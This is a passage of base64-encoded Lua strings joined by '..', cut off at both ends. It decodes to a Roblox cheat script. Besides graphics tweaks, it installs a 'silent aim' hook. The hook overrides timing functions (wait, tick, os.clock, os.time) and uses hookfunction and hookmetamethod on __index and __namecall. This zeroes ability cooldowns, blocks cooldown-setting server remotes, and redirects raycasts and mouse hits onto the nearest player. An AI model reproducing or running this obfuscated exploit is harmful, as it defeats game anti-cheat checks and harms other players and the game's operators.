9iai5Db2xvciA9IENvbmZpZy5Ub29sQ29sb3IKICAgICAgICAgICAgZWxzZWlmIG9iajpJc0EoIlBhcnRpY2xlRW1pdHRlciIpIG9yIG9iajpJc0EoIlRyYWlsIikgb3Igb2JqOklzQSgiQmVhbSIpIHRoZW4KICAgICAgICAgICAgICAgIGlmIG5vdCBvYmo6R2V0QXR0cmlidXRlKCJPcmlnaW5hbENvbG9yU2VxdWVuY2UiKSB0aGVuCiAgICAgICAgICAgICAgICAgICAgb2JqOlNl" .. "dEF0dHJpYnV0ZSgiT3JpZ2luYWxDb2xvclNlcXVlbmNlIiwgb2JqLkNvbG9yKQogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICBvYmouQ29sb3IgPSBDb2xvclNlcXVlbmNlLm5ldyhDb25maWcuVG9vbENvbG9yKQogICAgICAgICAgICBlbHNlaWYgb2JqOklzQSgiTGlnaHQiKSB0aGVuCiAgICAgICAgICAgICAgICBpZiBub3Qgb2JqOkdldEF0dHJpYnV0ZSgiT3JpZ2luYWxMaWdodENvbG9yIikgdGhlbgogICAgICAgICAgICAgICAgICAgIG9iajpTZXRBdHRyaWJ1dGUoIk9yaWdpbmFsTGlnaHRDb2xvciIsIG9iai5Db2xvcikKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgb2JqLkNvbG9yID0gQ29uZmlnLlRvb2xDb2xvcgogICAgICAgICAgICBlbHNlaWYgb2JqOklzQSgiRmlyZSIpIHRoZW4KICAgICAgICAgICAgICAgIGlmIG5vdCBvYmo6R2V0QXR0cmlidXRlKCJPcmlnaW5hbENvbG9yIikgdGhlbgogICAgICAgICAgICAgICAgICAgIG9iajpTZXRBdHRyaWJ1dGUoIk9yaWdpbmFsQ29sb3IiLCBvYmouQ29sb3IpCiAgICAgICAgICAgICAgICAgICAgb2JqOlNldEF0dHJpYnV0ZSgiT3JpZ2luYWxTZWNvbmRhcnlDb2xvciIsIG9iai5TZWNvbmRhcnlDb2xvcikKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgb2JqLkNvbG9yID0gQ29uZmlnLlRvb2xDb2xvcgogICAgICAgICAgICAgICAgb2JqLlNlY29uZGFyeUNvbG9yID0gQ29uZmlnLlRvb2xDb2xvcgogICAgICAgICAgICBlbHNlaWYgb2JqOklzQSgiU21va2UiKSB0aGVuCiAgICAgICAgICAgICAgICBpZiBub3Qgb2JqOkdldEF0dHJpYnV0ZSgiT3JpZ2luYWxDb2xvciIpIHRoZW4KICAgICAgICAgICAgICAgICAgICBvYmo6U2V0QXR0cmlidXRlKCJPcmlnaW5hbENvbG9yIiwgb2JqLkNvbG9yKQogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICBvYmouQ29sb3IgPSBDb25maWcuVG9vbENvbG9yCiAgICAgICAgICAgIGVsc2VpZiBvYmo6SXNBKCJTcGFya2xlcyIpIHRoZW4KICAgICAgICAgICAgICAgIGlmIG5vdCBvYmo6R2V0QXR0cmlidXRlKCJPcmlnaW5hbENvbG9yIikgdGhlbgogICAgICAgICAgICAgICAgICAgIG9iajpTZXRBdHRyaWJ1dGUoIk9yaWdpbmFsQ29sb3IiLCBvYmouU3BhcmtsZUNvbG9yKQogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICBvYmouU3BhcmtsZUNvbG9yID0gQ29uZmlnLlRvb2xDb2xvcgogICAgICAgICAgICBlbHNlaWYgb2JqOklzQSgiRGVjYWwiKSBvciBvYmo6SXNBKCJUZXh0dXJlIikgdGhlbgogICAgICAgICAgICAgICAgaWYgbm90IG9iajpHZXRBdHRyaWJ1dGUoIk9yaWdpbmFsQ29sb3IiKSB0aGVuCiAgICAgICAgICAgICAgICAgICAgb2JqOlNldEF0dHJpYnV0ZSgiT3JpZ2luYWxDb2xvciIsIG9iai5Db2xvcjMpCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgIG9iai5Db2xvcjMgPSBDb25maWcuVG9vbENvbG9yCiAgICAgICAgICAgIGVsc2VpZiBvYmo6SXNBKCJTZWxlY3Rpb25Cb3giKSBvciBvYmo6SXNBKCJTZWxlY3Rpb25TcGhlcmUiKSBvciBvYmo6SXNBKCJIaWdobGlnaHQiKSB0aGVuCiAgICAgICAgICAgICAgICBpZiBub3Qgb2JqOkdldEF0dHJpYnV0ZSgiT3JpZ2luYWxDb2xvciIpIHRoZW4KICAgICAgICAgICAgICAgICAgICBsb2NhbCBjb2xvciA9IChvYmo6SXNBKCJIaWdobGlnaHQiKSBhbmQgb2JqLkZpbGxDb2xvcikgb3Igb2JqLkNvbG9yCiAgICAgICAgICAgICAgICAgICAgb2JqOlNldEF0dHJpYnV0ZSgiT3JpZ2luYWxDb2xvciIsIGNvbG9yKQogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICBpZiBvYmo6SXNBKCJIaWdobGlnaHQiKSB0aGVuCiAgICAgICAgICAgICAgICAgICAgb2JqLkZpbGxDb2xvciA9IENvbmZpZy5Ub29sQ29sb3IKICAgICAgICAgICAgICAgICAgICBvYmouT3V0bGluZUNvbG9yID0gQ29uZmlnLlRvb2xDb2xvcgogICAgICAgICAgICAgICAgZWxzZQogICAgICAgICAgICAgICAgICAgIG9iai5Db2xvciA9IENvbmZpZy5Ub29sQ29sb3IKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICBlbmQKICAgICAgICBlbmQpCiAgICBlbmQKICAgIAogICAgLS0gUE9UQVRPIEdSQVBISUNTIFNFVFVQCiAgICBsb2NhbCBMaWdodGluZyA9IGdhbWU6R2V0U2VydmljZSgiTGlnaHRpbmciKQogICAgbG9jYWwgVGVycmFpbiA9IHdvcmtzcGFjZTpXYWl0Rm9yQ2hpbGQoIlRlcnJhaW4iKQogICAgbG9jYWwgcmVuZGVyU2V0dGluZ3MgPSBzZXR0aW5ncygpLlJlbmRlcmluZwogICAgCiAgICBsb2NhbCBwb3RhdG9ET0YgPSBMaWdodGluZzpGaW5kRmlyc3RDaGlsZCgiUG90YXRvRE9GIikgb3IgSW5zdGFuY2UubmV3KCJEZXB0aE9mRmllbGRFZmZlY3QiKQogICAgcG90YXRvRE9GLk5hbWUgPSAiUG90YXRvRE9GIgogICAgcG90YXRvRE9GLkZhckludGVuc2l0eSA9IDEKICAgIHBvdGF0b0RPRi5Gb2N1c0Rpc3RhbmNlID0gMC4xCiAgICBwb3RhdG9ET0YuSW5Gb2N1c1JhZGl1cyA9IDAKICAgIHBvdGF0b0RPRi5OZWFySW50ZW5zaXR5ID0gMQogICAgcG90YXRvRE9GLkVuYWJsZWQgPSBmYWxzZQogICAgcG90YXRvRE9GLlBhcmVudCA9IExpZ2h0aW5nCiAgICAKICAgIGxvY2FsIHBvdGF0b0NvbG9yID0gTGlnaHRpbmc6RmluZEZpcnN0Q2hpbGQoIlBvdGF0b0NvbG9yIikgb3IgSW5zdGFuY2UubmV3KCJDb2xvckNvcnJlY3Rpb25FZmZlY3QiKQogICAgcG90YXRvQ29sb3IuTmFtZSA9ICJQb3RhdG9Db2xvciIKICAgIHBvdGF0b0NvbG9yLlNhdHVyYXRpb24gPSAtMC41CiAgICBwb3RhdG9Db2xvci5Db250cmFzdCA9IC0wLjIKICAgIHBvdGF0b0NvbG9yLkVuYWJsZWQgPSBmYWxzZQogICAgcG90YXRvQ29sb3IuUGFyZW50ID0gTGlnaHRpbmcKICAgIAogICAgbG9jYWwgdmZ4Q2xhc3NlcyA9IHsKICAgICAgICBbIlBhcnRpY2xlRW1pdHRlciJdID0gdHJ1ZSwgWyJUcmFpbCJdID0gdHJ1ZSwgWyJCZWFtIl0gPSB0cnVlLCAKICAgICAgICBbIkZpcmUiXSA9IHRydWUsIFsiU21va2UiXSA9IHRydWUsIFsiU3BhcmtsZXMiXSA9IHRydWUsCiAgICAgICAgWyJFeHBsb3Npb24iXSA9IHRydWUsIFsiUG9pbnRMaWdodCJdID0gdHJ1ZSwgCiAgICAgICAgWyJTcG90TGlnaHQiXSA9IHRydWUsIFsiU3VyZmFjZUxpZ2h0Il0gPSB0cnVlLAogICAgICAgIFsiQmxvb21FZmZlY3QiXSA9IHRydWUsIFsiQmx1ckVmZmVjdCJdID0gdHJ1ZSwKICAgICAgICBbIlN1blJheXNFZmZlY3QiXSA9IHRydWUsIFsiQ2xvdWRzIl0gPSB0cnVlLCBbIkF0bW9zcGhlcmUiXSA9IHRydWUsCiAgICAgICAgWyJTZWxlY3Rpb25TcGhlcmUiXSA9IHRydWUsIFsiU2VsZWN0aW9uQm94Il0gPSB0cnVlLCBbIkhpZ2hsaWdodCJdID0gdHJ1ZSwKICAgICAgICBbIlNreSJdID0gdHJ1ZQogICAgfQoKICAgIGxvY2FsIGZ1bmN0aW9uIG1ha2VQb3RhdG8ob2JqKQogICAgICAgIHBjYWxsKGZ1bmN0aW9uKCkKICAgICAgICAgICAgbG9jYWwgbmFtZUxvd2VyID0gb2JqLk5hbWU6bG93ZXIoKQogICAgICAgICAgICBpZiB2ZnhDbGFzc2VzW29iai5DbGFzc05hbWVdIG9yIG5hbWVMb3dlcjpmaW5kKCJhdXJhIikgb3IgbmFtZUxvd2VyOmZpbmQoImVmZmVjdCIpIG9yIG5hbWVMb3dlcjpmaW5kKCJnbG93IikgdGhlbgogICAgICAgICAgICAgICAgaWYgb2JqOklzQSgiQmFzZVBhcnQiKSB0aGVuCiAgICAgICAgICAgICAgICAgICAgb2JqLlRyYW5zcGFyZW5jeSA9IENvbmZpZy5Qb3RhdG9HcmFwaGljcyBhbmQgMSBvciAwCiAgICAgICAgICAgICAgICBlbHNlCiAgICAgICAgICAgICAgICAgICAgb2JqLkVuYWJsZWQgPSBub3QgQ29uZmlnLlBvdGF0b0dyYXBoaWNzCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIAogICAgICAgICAgICBpZiBvYmo6SXNBKCJCYXNlUGFydCIpIHRoZW4KICAgICAgICAgICAgICAgIGlmIENvbmZpZy5Qb3RhdG9HcmFwaGljcyB0aGVuCiAgICAgICAgICAgICAgICAgICAgaWYgbm90IG9iajpHZXRBdHRyaWJ1dGUoIk9yaWdpbmFsTWF0ZXJpYWwiKSB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgIG9iajpTZXRBdHRyaWJ1dGUoIk9yaWdpbmFsTWF0ZXJpYWwiLCBvYmouTWF0ZXJpYWwpCiAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgb2JqLk1hdGVyaWFsID0gRW51bS5NYXRlcmlhbC5QbGFzdGljCiAgICAgICAgICAgICAgICAgICAgb2JqLkNhc3RTaGFkb3cgPSBmYWxzZQogICAgICAgICAgICAgICAgICAgIG9iai5SZWZsZWN0YW5jZSA9IDAKICAgICAgICAgICAgICAgIGVsc2UKICAgICAgICAgICAgICAgICAgICBsb2NhbCBvcmlnaW5hbCA9IG9iajpHZXRBdHRyaWJ1dGUoIk9yaWdpbmFsTWF0ZXJpYWwiKQogICAgICAgICAgICAgICAgICAgIGlmIG9yaWdpbmFsIHRoZW4gb2JqLk1hdGVyaWFsID0gb3JpZ2luYWwgZW5kCiAgICAgICAgICAgICAgICAgICAgb2JqLkNhc3RTaGFkb3cgPSB0cnVlCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgZW5kCgogICAgICAgICAgICBpZiBvYmo6SXNBKCJNZXNoUGFydCIpIG9yIG9iajpJc0EoIlNwZWNpYWxNZXNoIikgdGhlbgogICAgICAgICAgICAgICAgaWYgQ29uZmlnLlBvdGF0b0dyYXBoaWNzIHRoZW4KICAgICAgICAgICAgICAgICAgICBpZiBvYmo6SXNBKCJNZXNoUGFydCIpIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgb2JqLlJlbmRlckZpZGVsaXR5ID0gRW51bS5SZW5kZXJGaWRlbGl0eS5QZXJmb3JtYW5jZQogICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIGVuZAoKICAgICAgICAgICAgaWYgb2JqOklzQSgiRGVjYWwiKSBvciBvYmo6SXNBKCJUZXh0dXJlIikgdGhlbgogICAgICAgICAgICAgICAgb2JqLlRyYW5zcGFyZW5jeSA9IENvbmZpZy5Qb3RhdG9HcmFwaGljcyBhbmQgMSBvciAwCiAgICAgICAgICAgIGVuZAogICAgICAgIGVuZCkKICAgIGVuZAogICAgCiAgICAtLSA9PT0gU0lMRU5UIEFJTSBIT09LIChTdHJlYW1hYmxlKSA9PT0KICAgIGxvY2FsIF9faW5kZXgKICAgIGxvY2FsIF9fbmFtZWNhbGwKICAgIAogICAgcGNhbGwoZnVuY3Rpb24oKQogICAgICAgIC0tIEdsb2JhbCBXYWl0IEhvb2tzIGZvciBObyBDb29sZG93bgogICAgICAgIGxvY2FsIG9sZFdhaXQgPSB3YWl0CiAgICAgICAgZ2V0Z2VudigpLndhaXQgPSBmdW5jdGlvbihuKQogICAgICAgICAgICBpZiBDb25maWcuTm9Db29sZG93biBhbmQgbm90IGNoZWNrY2FsbGVyKCkgdGhlbgogICAgICAgICAgICAgICAgcmV0dXJuIG9sZFdhaXQoKQogICAgICAgICAgICBlbmQKICAgICAgICAgICAgcmV0dXJuIG9sZFdhaXQobikKICAgICAgICBlbmQKICAgICAgICAKICAgICAgICBsb2NhbCBvbGRUYXNrV2FpdCA9IHRhc2sud2FpdAogICAgICAgIGdldGdlbnYoKS50YXNrLndhaXQgPSBmdW5jdGlvbihuKQogICAgICAgICAgICBpZiBDb25maWcuTm9Db29sZG93biBhbmQgbm90IGNoZWNrY2FsbGVyKCkgdGhlbgogICAgICAgICAgICAgICAgcmV0dXJuIG9sZFRhc2tXYWl0KCkKICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIHJldHVybiBvbGRUYXNrV2FpdChuKQogICAgICAgIGVuZAoKICAgICAgICAtLSBUaW1lIEhvb2tzIHRvIGJ5cGFzcyAidGljaygpIC0gbGFzdFVzZSIgY2hlY2tzCiAgICAgICAgbG9jYWwgb2xkVGljayA9IHRpY2sKICAgICAgICBnZXRnZW52KCkudGljayA9IGZ1bmN0aW9uKCkKICAgICAgICAgICAgaWYgQ29uZmlnLk5vQ29vbGRvd24gYW5kIG5vdCBjaGVja2NhbGxlcigpIHRoZW4KICAgICAgICAgICAgICAgIHJldHVybiBvbGRUaWNrKCkgKyA5ZTkKICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIHJldHVybiBvbGRUaWNrKCkKICAgICAgICBlbmQKCiAgICAgICAgbG9jYWwgb2xkT3NDbG9jayA9IG9zLmNsb2NrCiAgICAgICAgZ2V0Z2VudigpLm9zLmNsb2NrID0gZnVuY3Rpb24oKQogICAgICAgICAgICBpZiBDb25maWcuTm9Db29sZG93biBhbmQgbm90IGNoZWNrY2FsbGVyKCkgdGhlbgogICAgICAgICAgICAgICAgcmV0dXJuIG9sZE9zQ2xvY2soKSArIDllOQogICAgICAgICAgICBlbmQKICAgICAgICAgICAgcmV0dXJuIG9sZE9zQ2xvY2soKQogICAgICAgIGVuZAoKICAgICAgICBsb2NhbCBvbGRPc1RpbWUgPSBvcy50aW1lCiAgICAgICAgZ2V0Z2VudigpLm9zLnRpbWUgPSBmdW5jdGlvbigpCiAgICAgICAgICAgIGlmIENvbmZpZy5Ob0Nvb2xkb3duIGFuZCBub3QgY2hlY2tjYWxsZXIoKSB0aGVuCiAgICAgICAgICAgICAgICByZXR1cm4gb2xkT3NUaW1lKCkgKyA5ZTkKICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIHJldHVybiBvbGRPc1RpbWUoKQogICAgICAgIGVuZAoKICAgICAgICAtLSBMb3ctbGV2ZWwgSG9va0Z1bmN0aW9uIGZvciBUaW1lIChVbmJ5cGFzc2FibGUgYnkgbG9jYWxpemF0aW9uKQogICAgICAgIGlmIGhvb2tmdW5jdGlvbiB0aGVuCiAgICAgICAgICAgIGxvY2FsIG9sZFQ7IG9sZFQgPSBob29rZnVuY3Rpb24odGljaywgZnVuY3Rpb24oKQogICAgICAgICAgICAgICAgaWYgQ29uZmlnLk5vQ29vbGRvd24gYW5kIG5vdCBjaGVja2NhbGxlcigpIHRoZW4gcmV0dXJuIG9sZFQoKSArIDllOSBlbmQKICAgICAgICAgICAgICAgIHJldHVybiBvbGRUKCkKICAgICAgICAgICAgZW5kKQogICAgICAgICAgICBsb2NhbCBvbGRDOyBvbGRDID0gaG9va2Z1bmN0aW9uKG9zLmNsb2NrLCBmdW5jdGlvbigpCiAgICAgICAgICAgICAgICBpZiBDb25maWcuTm9Db29sZG93biBhbmQgbm90IGNoZWNrY2FsbGVyKCkgdGhlbiByZXR1cm4gb2xkQygpICsgOWU5IGVuZAogICAgICAgICAgICAgICAgcmV0dXJuIG9sZEMoKQogICAgICAgICAgICBlbmQpCiAgICAgICAgZW5kCgogICAgICAgIF9faW5kZXggPSBob29rbWV0YW1ldGhvZChnYW1lLCAiX19pbmRleCIsIGZ1bmN0aW9uKHQsIGspCiAgICAgICAgICAgIGlmIENvbmZpZy5Ob0Nvb2xkb3duIGFuZCBub3QgY2hlY2tjYWxsZXIoKSB0aGVuCiAgICAgICAgICAgICAgICBsb2NhbCB0U3RyID0gdG9zdHJpbmcodCk6bG93ZXIoKQogICAgICAgICAgICAgICAgbG9jYWwga1N0ciA9IHRvc3RyaW5nKGspOmxvd2VyKCkKICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgLS0gQ2F0Y2ggYWxsIGNvb2xkb3duLXJlbGF0ZWQgdmFsdWUgcmVhZHMKICAgICAgICAgICAgICAgIGlmIChrU3RyID09ICJ2YWx1ZSIgb3Iga1N0ciA9PSAiVmFsdWUiKSB0aGVuCiAgICAgICAgICAgICAgICAgICAgbG9jYWwgbmFtZSA9ICIiCiAgICAgICAgICAgICAgICAgICAgcGNhbGwoZnVuY3Rpb24oKSBuYW1lID0gdC5OYW1lOmxvd2VyKCkgZW5kKQogICAgICAgICAgICAgICAgICAgIGlmIG5hbWU6ZmluZCgiY29vbGRvd24iKSBvciBuYW1lOmZpbmQoImNkIikgb3IgbmFtZTpmaW5kKCJza2lsbCIpIG9yIG5hbWU6ZmluZCgidGltZXIiKSBvciBuYW1lOmZpbmQoImFiaWxpdHkiKSBvciBuYW1lOmZpbmQoInN0dW4iKSBvciBuYW1lOmZpbmQoImJ1c3kiKSB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybiAwCiAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgLS0gQ2F0Y2ggY29vbGRvd24gcHJvcGVydHkgcmVhZHMKICAgICAgICAgICAgICAgIGlmIGtTdHI6ZmluZCgiY29vbGRvd24iKSBvciBrU3RyID09ICJjZCIgb3Iga1N0ciA9PSAic2tpbGxjZCIgdGhlbgogICAgICAgICAgICAgICAgICAgIHJldHVybiAwCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgLS0gQ2F0Y2ggc3R1bi9idXN5IHN0YXRlcwogICAgICAgICAgICAgICAgaWYga1N0ciA9PSAic3R1biIgb3Iga1N0ciA9PSAiYnVzeSIgb3Iga1N0ciA9PSAidXNpbmciIG9yIGtTdHIgPT0gImNhc3RpbmciIG9yIGtTdHIgPT0gImF0dGFja2luZyIgdGhlbgogICAgICAgICAgICAgICAgICAgIHJldHVybiBmYWxzZQogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIGVuZAoKICAgICAgICAgICAgLS0gRml4OiBBY3RpdmUgbGUgU2lsZW50IEFpbSBhdXRvbWF0aXF1ZW1lbnQgc2kgSGl0Ym94IEV4dGVuZGVyIGVzdCBPTiBwb3VyIHZhbGlkZXIgbGVzIGTDqWfDonRzIHNlcnZldXIKICAgICAgICAgICAgaWYgKENvbmZpZy5TaWxlbnRBaW0gb3IgQ29uZmlnLkhpdGJveEV4cGFuZGVyKSBhbmQgKHQgPT0gbW91c2Ugb3IgdG9zdHJpbmcodCkgPT0gIk1vdXNlIikgdGhlbgogICAgICAgICAgICAgICAgaWYgayA9PSAiSGl0IiBvciBrID09ICJUYXJnZXQiIG9yIGsgPT0gIlVuaXRSYXkiIHRoZW4KICAgICAgICAgICAgICAgICAgICBsb2NhbCB0YXJnZXQgPSBnZXRDbG9zZXN0UGxheWVyVG9Nb3VzZShDb25maWcuU2lsZW50Rk9WLCB0cnVlKQogICAgICAgICAgICAgICAgICAgIGlmIHRhcmdldCBhbmQgdGFyZ2V0LkNoYXJhY3RlciB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgIC0tIFByaW9yaXTDqSBhdSBUb3JzZSAoSHVtYW5vaWRSb290UGFydCkgY2FyIHBsdXMgZ3JvcwogICAgICAgICAgICAgICAgICAgICAgICBsb2NhbCB0YXJnZXRQYXJ0ID0gdGFyZ2V0LkNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCgiSHVtYW5vaWRSb290UGFydCIpIG9yIHRhcmdldC5DaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGQoIlRvcnNvIikgb3IgdGFyZ2V0LkNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCgiSGVhZCIpCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIHRhcmdldFBhcnQgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgayA9PSAiSGl0IiB0aGVuIHJldHVybiB0YXJnZXRQYXJ0LkNGcmFtZSBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIGsgPT0gIlRhcmdldCIgdGhlbiByZXR1cm4gdGFyZ2V0UGFydCBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIGsgPT0gIlVuaXRSYXkiIHRoZW4gCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgbG9jYWwgb3JpZ2luID0gY2FtZXJhLkNGcmFtZS5Qb3NpdGlvbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxvY2FsIGRpcmVjdGlvbiA9ICh0YXJnZXRQYXJ0LlBvc2l0aW9uIC0gb3JpZ2luKS5Vbml0CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuIFJheS5uZXcob3JpZ2luLCBkaXJlY3Rpb24pCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIHJldHVybiBfX2luZGV4KHQsIGspCiAgICAgICAgZW5kKQogICAgICAgIAogICAgICAgIF9fbmFtZWNhbGwgPSBob29rbWV0YW1ldGhvZChnYW1lLCAiX19uYW1lY2FsbCIsIGZ1bmN0aW9uKHNlbGYsIC4uLikKICAgICAgICAgICAgbG9jYWwgbWV0aG9kID0gZ2V0bmFtZWNhbGxtZXRob2QoKQogICAgICAgICAgICBsb2NhbCBhcmdzID0gey4uLn0KICAgICAgICAgICAgCiAgICAgICAgICAgIGlmIENvbmZpZy5Ob0Nvb2xkb3duIGFuZCBub3QgY2hlY2tjYWxsZXIoKSB0aGVuCiAgICAgICAgICAgICAgICBpZiBtZXRob2QgPT0gIkdldEF0dHJpYnV0ZSIgdGhlbgogICAgICAgICAgICAgICAgICAgIGxvY2FsIGF0dHIgPSBhcmdzWzFdCiAgICAgICAgICAgICAgICAgICAgaWYgdHlwZShhdHRyKSA9PSAic3RyaW5nIiB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgIGxvY2FsIGF0dHJMID0gYXR0cjpsb3dlcigpCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIGF0dHJMOmZpbmQoImNvb2xkb3duIikgb3IgYXR0ckw6ZmluZCgiY2QiKSBvciBhdHRyTDpmaW5kKCJsYXN0dXNlIikgb3IgYXR0ckw6ZmluZCgibmV4dHVzZSIpIG9yIGF0dHJMOmZpbmQoInRpbWVyIikgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuIDAKICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIGF0dHJMID09ICJzdHVuIiBvciBhdHRyTCA9PSAiYnVzeSIgb3IgYXR0ckwgPT0gInVzaW5nIiBvciBhdHRyTCA9PSAiY2FzdGluZyIgb3IgYXR0ckwgPT0gImF0dGFja2luZyIgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuIGZhbHNlCiAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgZWxzZWlmIG1ldGhvZCA9PSAiSW52b2tlU2VydmVyIiBvciBtZXRob2QgPT0gIkZpcmVTZXJ2ZXIiIHRoZW4KICAgICAgICAgICAgICAgICAgICAtLSBCbG9jay9Nb2RpZnkgb25seSBjb29sZG93bi1zZXR0aW5nIHJlbW90ZXMKICAgICAgICAgICAgICAgICAgICBsb2NhbCBzZWxmTmFtZSA9IHRvc3RyaW5nKHNlbGYpOmxvd2VyKCkKICAgICAgICAgICAgICAgICAgICBpZiBzZWxmTmFtZSA9PSAiY29tbWZfIiBvciBzZWxmTmFtZTpmaW5kKCJyZW1vdGUiKSBvciBzZWxmTmFtZTpmaW5kKCJldmVudCIpIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgbG9jYWwgY21kID0gYXJnc1sxXQogICAgICAgICAgICAgICAgICAgICAgICBpZiB0eXBlKGNtZCkgPT0gInN0cmluZyIgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgbG9jYWwgY21kTG93ZXIgPSBjbWQ6bG93ZXIoKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgY21kTG93ZXIgPT0gImNvb2xkb3duIiBvciBjbWRMb3dlciA9PSAic2V0Y29vbGRvd24iIG9yIGNtZExvd2VyOmZpbmQoInNraWxsY29vbGRvd24iKSBvciBjbWRMb3dlcjpmaW5kKCJhYmlsaXR5Y29vbGRvd24iKSB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuIG5pbAogICAgICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgZWxzZWlmIG1ldGhvZCA9PSAiU2V0QXR0cmlidXRlIiB0aGVuCiAgICAgICAgICAgICAgICAgICAgbG9jYWwgYXR0ciA9IGFyZ3NbMV0KICAgICAgICAgICAgICAgICAgICBpZiB0eXBlKGF0dHIpID09ICJzdHJpbmciIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgbG9jYWwgYXR0ckwgPSBhdHRyOmxvd2VyKCkKICAgICAgICAgICAgICAgICAgICAgICAgaWYgYXR0ckw6ZmluZCgiY29vbGRvd24iKSBvciBhdHRyTDpmaW5kKCJjZCIpIG9yIGF0dHJMID09ICJzdHVuIiBvciBhdHRyTCA9PSAiYnVzeSIgb3IgYXR0ckwgPT0gInVzaW5nIiBvciBhdHRyTCA9PSAiY2FzdGluZyIgb3IgYXR0ckwgPT0gImF0dGFja2luZyIgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuCiAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIGVuZAoKICAgICAgICAgICAgaWYgKENvbmZpZy5TaWxlbnRBaW0gb3IgQ29uZmlnLkhpdGJveEV4cGFuZGVyKSB0aGVuCiAgICAgICAgICAgICAgICBpZiBtZXRob2QgPT0gIlJheWNhc3QiIGFuZCBzZWxmID09IHdvcmtzcGFjZSB0aGVuCiAgICAgICAgICAgICAgICAgICAgbG9jYWwgdGFyZ2V0ID0gZ2V0Q2xvc2VzdFBsYXllclRvTW91c2UoQ29uZmlnLlNpbGVudEZPViwgdHJ1ZSkKICAgICAgICAgICAgICAgICAgICBpZiB0YXJnZXQgYW5kIHRhcmdldC5DaGFyYWN0ZXIgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICBsb2NhbCB0YXJnZXRQYXJ0ID0gdGFyZ2V0LkNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCgiSHVtYW5vaWRSb290UGFydCIpIG9yIHRhcmdldC5DaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGQoIlRvcnNvIikgb3IgdGFyZ2V0LkNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCgiSGVhZCIpCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIHRhcmdldFBhcnQgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgbG9jYWwgb3JpZ2luID0gYXJnc1sxXQogICAgICAgICAgICAgICAgICAgICAgICAgICAgbG9jYWwgZGlyZWN0aW9uID0gKHRhcmdldFBhcnQuUG9zaXRpb24gLSBvcmlnaW4pLlVuaXQgKiBhcmdzWzJdLk1hZ25pdHVkZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuIF9fbmFtZWNhbGwoc2VsZiwgb3JpZ2luLCBkaXJlY3Rpb24sIGFyZ3NbM10pCiAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgZWxzZWlmIChtZXRob2QgPT0gIlNjcmVl" .. 